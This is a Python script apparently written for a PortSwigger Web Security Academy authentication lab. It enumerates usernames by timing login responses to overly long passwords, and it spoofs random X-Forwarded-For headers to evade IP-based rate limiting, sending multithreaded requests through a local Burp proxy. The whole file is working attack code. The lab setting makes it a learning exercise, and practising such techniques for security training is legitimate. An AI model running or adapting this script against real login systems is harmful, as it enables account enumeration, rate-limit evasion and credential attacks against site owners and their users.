#!/usr/bin/python3

import requests, threading, time, random
from operator import attrgetter
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

maxthreads = 5
sema = threading.Semaphore(value=maxthreads)
threads = []
responses = list()

repeat_count = 5
request_number = 0
wordlist_path = "/home/p4cm4n/Pentest_Learning/PortSwigger/Authentication/usernames"
wordlist = list()

error_data = list()
url = "0a92000e03101cbe81ff5cd200ef0062.web-security-academy.net"
burp0_url = f"https://{url}:443/login"
burp0_cookies = {"session": "mQXiZFLpFBr60O36s8LpoJFNx4d4DrmG"}


class resp_data:
    def __init__(self, word, time):
        self.word = word
        self.time = time


def get_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def send_req(word, ip):
    sema.acquire()
    global request_number

    burp0_headers = {"Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Google Chrome\";v=\"113\",\"Chromium\";v=\"113\",Not-A.Brand\";v=\"24\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Linux\"",
    "Origin": f"https://{url}/",
    "Dnt": "1",
    "X-Forwarded-For": ip,
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": f"https://{url}/login",
    "Accept-Encoding": "gzip,deflate",
    "Accept-Language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7,fa;q=0.6,de;q=0.5",
    "Connection": "close"}
    burp0_data = {"username": word,
    "password": "aasdasdasdasdasdasdasdasdasdasdasdadasdasdowihjqoeirvhnweorvnwoasdasdasdasdasdasdasdadasdaorvnwoasdasdasdasdasdasdasdadasdasdowihjqoeirvhnweorvnwo"
    }
    proxy = {"http":"http://127.0.0.1:8080" , "https":"http://127.0.0.1:8080"}

    try:
        r = requests.post(burp0_url,
        headers=burp0_headers,
        proxies=proxy,
        data=burp0_data,
        cookies=burp0_cookies, verify=False, timeout=20)

        resp_time = r.elapsed.total_seconds()

        responses.append(resp_data(word,resp_time))
    except Exception as test:
        with open("errors.log","a") as f:
            f.write(f"{word} {ip} \t \t {test}\n")

    print(request_number, end="\r")
    request_number += 1
    sema.release()


def bruteforce():

    count = len(wordlist)
    for k in range(1, repeat_count):
        for i in range(0, count):
            ip = get_ip()
            t = threading.Thread(target=send_req, args =(wordlist[i],ip,))
            t.start()
            threads.append(t)

    for thread in threads:
        thread.join()


with open(wordlist_path, "r") as f:
    wordlist = f.read().splitlines()

bruteforce()


if(len(responses) > 10):
    new_list = sorted(responses, key=lambda x: x.time, reverse=True)
    for i in range(0,10):
        print(f"{new_list[i].word} {new_list[i].time}")


with open("result.out","a") as f:
    for data in responses:
        f.write(f"{data.word}\t{data.time}\n")




